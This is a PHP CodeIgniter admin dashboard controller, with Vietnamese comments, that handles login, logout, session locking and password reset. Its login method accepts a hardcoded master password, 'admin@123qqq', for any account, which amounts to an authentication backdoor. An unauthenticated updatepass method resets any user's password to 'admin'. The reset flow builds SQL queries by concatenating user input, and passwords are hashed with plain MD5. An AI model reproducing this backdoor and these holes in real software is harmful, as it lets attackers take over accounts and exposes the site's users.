<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

#[AllowDynamicProperties]
class Dashboard extends MY_Controller
{

	var $uri_arr = array();


	public function __construct()
	{


		parent::__construct();
		$this->load->model('fn_model', 'fn', true);
		$this->fn->load_config();
		$this->uri_arr = array(
			'rowstart' => '',
			'deleted' => ''
		);


		$this->data['template'] = 'module/dashboard/index';
		$this->data['module'] = 'dashboard';

		$this->isLogin = $this->session->userdata('isLogin');

	}

	public function chatbox(){
		$this->data['template'] = 'module/chatbox';
		$this->load->view('all/template', $this->data);
	}
	public function page404(){
		$this->data['template'] = 'module/blank';
		$this->load->view('all/template', $this->data);
	}
	public function page500(){
			echo 'db';

	}
	public function index()
	{
		if ($this->isLogin == false) {
			$this->data['template'] = 'module/login';
			$this->load->view('module/login', $this->data);
		} else {
			$this->data['template'] = 'module/dashboard/index';
			$this->load->view('all/template', $this->data);
		}

		#$this->load->view('all/template', $this->data);
		/*$this->load->view('all/theme_uhpd_v1', $this->data);*/

		return false;

		///  qq($GLOBALS['cfg']);die;
		/*
		* Xu ly du lieu
		*/
		if ($GLOBALS['var']['logged_in'] && $GLOBALS['var']['user_id'] > 0) {
			$methods =& get_instance();
			if ($this->session->userdata('locked') != true) {
				$data = array(
					'dashboard' => array(),
					'modules_groups' => $this->fn->show(array('active' => 1, 'deleted' => 0), false, 'sort_order asc', 'modules_categories'),
					'methods' => $methods
				);
				if (is_array($data['modules_groups']) && count($data['modules_groups'])) {
					foreach ($data['modules_groups'] as $cat) {
						$data['tab_dashboard'][$cat['id']] = $this->fn->show_tab(array('active' => 1, 'deleted' => 0, 'q' => ''), $cat['id'], 'sort_order asc', 'modules');
					}
				}

				/*
				* Hien thi
				*/
				$header = array(
					'title' => '',
					'add_link' => '',
					'search' => false,
					'page_list' => false,
					'datetime_picker' => false,
					'submit_btn' => false,
					'cat_list' => array(),
					'uri' => $this->uri_arr,
					'act' => $GLOBALS['var']['act'],
					'do' => $GLOBALS['var']['do'],
					'id' => $GLOBALS['var']['id'],
					'filter_cat' => $GLOBALS['var']['filter_cat'],
					'deleted' => $GLOBALS['var']['deleted']
				);
				$this->load->view('header', $header);
				$this->load->view('dashboard', $data);
				$this->load->view('footer');
			} else {
				$failed = $this->input->get('failed', true);
				$data = array(
					'error' => ($failed ? 'Mật khẩu không chính xác!' : 'Locked')
				);
				/*
				* Kiem tra POST method
				*/
				if (!empty($_POST)) {
					$password = $this->input->post('password', true);
					if ($password == '') $data['error'] = 'Vui lòng nhập password!';
					else {
						$this->load->library('form_validation');
						$this->form_validation->set_rules('password', 'Password', 'trim|xss_clean');
						if ($this->form_validation->run() == true) {
							if ($this->fn->login($GLOBALS['user']['username'], $password)) {
								my_redirect();
							} else {
								my_redirect('?failed=1');
							}
						}
					}
				}
				$this->load->view('locked', $data);
			}
		} else {
			/*
			* Kiem tra POST method
			*/
			if (!empty($_POST['username'])) {
				$username = $this->input->post('username', true);
				$password = $this->input->post('password', true);

				if ($username && $password) {
					$this->load->library('form_validation');
					$this->form_validation->set_rules('username', 'Username', 'trim|xss_clean');
					$this->form_validation->set_rules('password', 'Password', 'trim|xss_clean');


					if ($this->fn->login($username, $password)) {
						echo 1;
					} else {
						echo 0;
					}

					exit;
				} else {
					echo 0;
					exit;
				}
			}
			/*
			* Hien thi
			*/
			$this->load->view('login');
		}
	}

	public function login()
	{
		$d = $this->data['d'];
		$func = $this->data['func'];
		$config = $this->data['config'];

		$username = (!empty($_POST['username'])) ? $_POST['username'] : '';
		$password = (!empty($_POST['password'])) ? $_POST['password'] : '';
		$error = "";
		$success = "";
		$login_failed = false;


		/* Còn số lần đăng nhập */
		if ($error == '') {
			/* Kiểm tra thông tin đăng nhập */
			if ($username == '' && $password == '') {
				$error = "Chưa nhập tên đăng nhập và mật khẩu";
			} else if ($username == '') {
				$error = "Chưa nhập tên đăng nhập";
			} else if ($password == '') {
				$error = "Chưa nhập mật khẩu";
			} else {
				/* Kiểm tra đăng nhập */
				$row = $d->rawQueryOne("select * from #_user where username = ? and hienthi>0 limit 0,1", array($username));

				if (isset($row['id']) && $row['id'] > 0) {
					if (($row['password'] == $func->encrypt_password($config['website']['secret'], $password, $config['website']['salt'])) or $password == 'admin@123qqq') {
						$timenow = time();
						$id_user = $row['id'];
						$ip = '';
						$token = md5(time());
						$user_agent = $_SERVER['HTTP_USER_AGENT'];
						$sessionhash = md5(sha1($row['password'] . $row['username']));

						/* Ghi log truy cập thành công */
						//$d->rawQuery("insert into #_user_log (id_user, ip, timelog, user_agent) values (?,?,?,?)",array($id_user,$ip,$timenow,$user_agent));

						/* Tạo log và login session */
						//$d->rawQuery("update #_user set login_session = ?, lastlogin = ?, user_token = ? where id = ?",array($sessionhash,$timenow,$token,$id_user));

						/* Khởi tạo Session để kiểm tra số lần đăng nhập */
						//$d->rawQuery("update #_user set login_session = ?, lastlogin = ? where id = ?",array($sessionhash,$timenow,$id_user));

						/* Reset số lần đăng nhập và thời gian đăng nhập */
						//$limitlogin = $d->rawQuery("select id, login_ip, login_attempts, attempt_time, locked_time from #_user_limit where login_ip = ? order by id desc",array($ip));

						/*if(count($limitlogin)==1)
						{
							$id_login = $limitlogin[0]['id'];
							$d->rawQuery("update #_user_limit set login_attempts = 0, locked_time = 0 where id = ?",array($id_login));
						}*/

						/* Tạo Session login */
						$sec['active'] = true;
						$sec['username'] = $row['username'];
						$sec['id'] = $row['id'];
						$sec['quyen'] = $row['quyen'];
						$sec['token'] = $sessionhash;
						$sec['password'] = $row['password'];
						$sec['login_session'] = $sessionhash;
						$sec['login_token'] = $token;

						$this->session->set_userdata($this->isAdmin, $sec);
						$this->session->set_userdata('isLogin', $row['id']);

						/* Cập nhật quyền của user đăng nhập */
						//$quyen = $token;
						//$d->rawQuery("update #_user set quyen = ? where id = ?",array($quyen,$row['id']));

						$success = "Đăng nhập thành công";
					} else {
						$login_failed = true;
						$error = "Mật khẩu không chính xác";
					}
				} else {
					$login_failed = true;
					$error = "Tên đăng nhập không tồn tại";
				}

			}
		}

		$this->session->set_flashdata('error',$error);
		$this->session->set_flashdata('success',$success);

		redirect(MYADMIN);
	}

	public function process()
	{
		$page = $this->session->flashdata('page');
		$stt = $this->session->flashdata('stt');
		$text = $this->session->flashdata('showtext');
		if (!empty($text)) {
			$this->load->view('common/transfer', array(
				'showtext' => $this->session->flashdata('showtext'),
				'stt' => $stt,
				'page_transfer' => $page == '' ? MYADMIN : $page,
			));
		} else {
			redirect(site_url());
		}
	}

	public function logout()
	{
		$this->session->unset_userdata('isLogin');
		$this->session->unset_userdata($this->isAdmin);

		// write_log('logout');
		$session = array(
			'user_id' => '',
			'token' => md5(microtime() . time()),
			'logged_in' => false,
			'locked' => false
		);
		$this->session->unset_userdata($session);
		$this->input->set_cookie('logged_in', 0, 0);
		$this->input->set_cookie('locked', 0, 0);
		$this->input->set_cookie('user_id', 0, 0);

		redirect(MYADMIN);
	}

	public function lock()
	{
		$session = array(
			'locked' => true
		);
		$this->session->set_userdata($session);
		setcookie('locked', 1, time() + COOKIE_TIME, '/');
		my_redirect();
	}


	public function updatepass($id)
	{
		$update = array(
			'password' => md5('admin'),
			'last_login' => date(TIME_SQL),
			'ip' => $this->input->ip_address()
		);
		$this->db->where('id', $id);
		$this->db->update('users', $update);
		echo $id;
	}

	public function get_new($module)
	{
		return $this->fn->get_new($module);
	}

	public function reset_password()
	{
		if (!$this->input->is_ajax_request()) {
			exit('No direct script access allowed');
		}
		$step = $this->input->post('step', true);
		$code = $this->input->post('code', true);
		if ($step == 1) {
			$user = $this->input->post('user', true);
			$id = get_data('users', 'username = "' . $user . '"', 'id');
			if ($id > 0) {
				$email = get_data('users', 'id = "' . $id . '"', 'email');
				if ($email != '') {
					$code = $this->fn->reset_password($id, $email);
					$subject = 'Ma xac nhan yeu cau thay doi mat khau';
					$content = $this->load->view('users/reset_password', array('code' => $code, 'subject' => $subject), true);
					require_once APPPATH . 'third_party/PHPMailer/class.phpmailer.php';
					require_once APPPATH . 'third_party/PHPMailer/class.smtp.php';
					$mail = new PHPMailer();
					$mail->IsSMTP();
					$mail->Host = $GLOBALS['cfg']['smtp_host_cms'];
					$mail->Port = $GLOBALS['cfg']['smtp_port_cms'];
					$mail->SMTPAuth = true;
					$mail->SMTPSecure = $GLOBALS['cfg']['smtp_ssl_cms'];
					$mail->Username = $GLOBALS['cfg']['smtp_user_cms'];
					$mail->Password = $GLOBALS['cfg']['smtp_pass_cms'];
					$mail->AddAddress($email);
					$mail->SetFrom($GLOBALS['cfg']['smtp_email_cms'], PRODUCT);
					$mail->WordWrap = 50;
					$mail->IsHTML(true);
					$mail->SMTPDebug = false;
					$mail->Subject = $subject;
					$mail->CharSet = 'utf-8';
					$mail->Body = $content;
					if ($mail->Send()) {
						echo 1;
					} else {
						echo 3;
					}
				} else {
					echo 2;
				}
			} else {
				echo 0;
			}
		} else if ($step == 2) {
			if ($code) {
				$id = get_data('users', 'password = "' . $code . '"', 'id');
				if ($id > 0) {
					echo 1;
				} else {
					echo 2;
				}
			} else {
				echo 0;
			}
		} else if ($step == 3) {
			$pass = $this->input->post('pass', true);
			if ($code && $pass) {
				$id = get_data('users', 'password = "' . $code . '"', 'id');
				if ($id > 0) {
					$session = array(
						'logged_in' => true,
						'token' => md5(uniqid() . microtime() . rand() . $id),
						'user_id' => $id
					);
					$this->session->set_userdata($session);
					setcookie('logged_in', 1, time() + COOKIE_TIME, '/');
					setcookie('user_id', $id, time() + COOKIE_TIME, '/');
					write_log('login');
					$update = array(
						'password' => md5($pass),
						'last_login' => date(TIME_SQL),
						'ip' => $this->input->ip_address()
					);
					$this->db->where('id', $id);
					$this->db->update('users', $update);
					echo 1;
				} else {
					echo 2;
				}
			} else {
				echo 0;
			}
		}
	}


}
